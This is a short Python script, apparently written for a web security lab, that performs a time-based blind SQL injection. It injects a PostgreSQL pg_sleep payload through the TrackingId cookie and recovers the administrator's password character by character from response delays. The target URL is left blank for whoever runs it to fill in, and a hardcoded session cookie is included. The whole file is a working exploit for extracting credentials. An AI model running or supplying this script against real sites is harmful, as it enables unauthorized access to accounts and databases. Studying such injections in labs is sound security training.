import pwn,sys,requests,string,time,signal,pdb

def interrupt_handler(signum,frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)
# ctrl + C
signal.signal(signal.SIGINT, interrupt_handler)

def bruteForceString():
    main_url = '' # insert the url that you want to apply brute force
    characters = string.ascii_lowercase + string.digits
    string_requested = ""
    p1 = pwn.log.progress("Brute Force")
    #p1.status("Iniciating brute force attack")

    #p2 = pwn.log.progress("Password")

    for position in range (1,21):
        for character in characters:
            #example of payload with SQL injection
            cookies = {   
                'TrackingId': f"Vj2gvL1X1hEcSKlf' || (select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' and substring(password,{position},1) = '{character}') --",
                'session': 'qlzNN0v69Baf1tZ2IxzuszL6t19VTSve'
            }

            #p1.status(cookies['TrackingId'])
            time_start =time.time()
            r = requests.get(main_url,cookies=cookies) 
            time_end =time.time()
            if (time_end - time_start) > 5: #response time
                string_requested += character
                print(string_requested)
                break
    print(string_requested)


if __name__ == '__main__':
    
    bruteForceString()

